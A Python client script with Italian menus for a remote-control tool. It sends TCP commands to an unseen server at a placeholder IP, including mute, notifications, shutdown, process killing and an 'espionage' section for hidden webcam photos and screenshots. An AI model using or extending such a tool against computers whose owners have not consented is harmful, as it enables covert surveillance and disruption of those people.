import socket
import sys

# Configurazione di Rete
SERVER_IP = 'INSERISCI_QUI_IL_TUO_IP'
PORT = 9999


def invia_comando(comando_da_inviare):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_IP, PORT))
        client.send(comando_da_inviare.encode('utf-8'))
        client.close()
        print(
            f"[+] Trasmesso: Comando '{comando_da_inviare}' inviato con successo.")
    except Exception as e:
        print(f"[-] Errore critico: Impossibile stabilire la connessione col server.")
        print(f"    Dettaglio eccezione: {e}")


if __name__ == "__main__":
    while True:
        print("\n=============================================")
        print(" INTERFACCIA DI CONTROLLO REMOTO (V. 3.0)")
        print("=============================================")
        print("\n[ MEDIA & INTERAZIONE ]")
        print("1. 🔇 Modifica stato volume (Mute/Unmute)")
        print("2. 📣 Trasmetti notifica a schermo")
        print("3. 🗣️ Text-to-Speech (Fai parlare il PC)")
        print("4. 🌍 Apri URL / Video remoto")

        print("\n[ ALIMENTAZIONE & SICUREZZA BASE ]")
        print("5. 🔒 Blocca sessione utente")
        print("6. 🛏️ Spegni PC (Timer 60 secondi)")
        print("7. 🛑 Annulla spegnimento")

        print("\n[ SPIONAGGIO & SICUREZZA AVANZATA ]")
        print("8. 📸 Scatta foto nascosta da Webcam")
        print("9. 🖥️ Salva Screenshot del desktop")
        print("10. 🚨 Lancia Allarme Intruso (Volume Max)")

        print("\n[ CONTROLLO SISTEMA ]")
        print("11. 🎧 Avvia Modalità Focus (Testi)")
        print("12. 💣 Kill Process (Chiudi app forzatamente)")

        print("\n0. ❌ Termina Client")

        scelta = input("\n👉 Inserisci il numero del comando: ")

        if scelta == "1":
            invia_comando("MUTA")
        elif scelta == "2":
            invia_comando("NOTIFICA")
        elif scelta == "3":
            frase = input("Frase da pronunciare: ")
            invia_comando(f"PARLA:{frase}")
        elif scelta == "4":
            url = input("Link da aprire (es. https://youtube.com): ")
            invia_comando(f"APRI:{url}")
        elif scelta == "5":
            invia_comando("BLOCCO")
        elif scelta == "6":
            invia_comando("SPEGNI")
        elif scelta == "7":
            invia_comando("ANNULLA_SPEGNI")
        elif scelta == "8":
            invia_comando("FOTO")
        elif scelta == "9":
            invia_comando("SCREENSHOT")
        elif scelta == "10":
            invia_comando("ALLARME")
        elif scelta == "11":
            invia_comando("FOCUS")
        elif scelta == "12":
            app = input("Nome esatto del processo da uccidere (es. firefox): ")
            invia_comando(f"KILL:{app}")
        elif scelta == "0":
            print("[*] Disconnessione effettuata. Chiusura programma.")
            sys.exit(0)
        else:
            print("[-] Input non valido. Riprovare.")
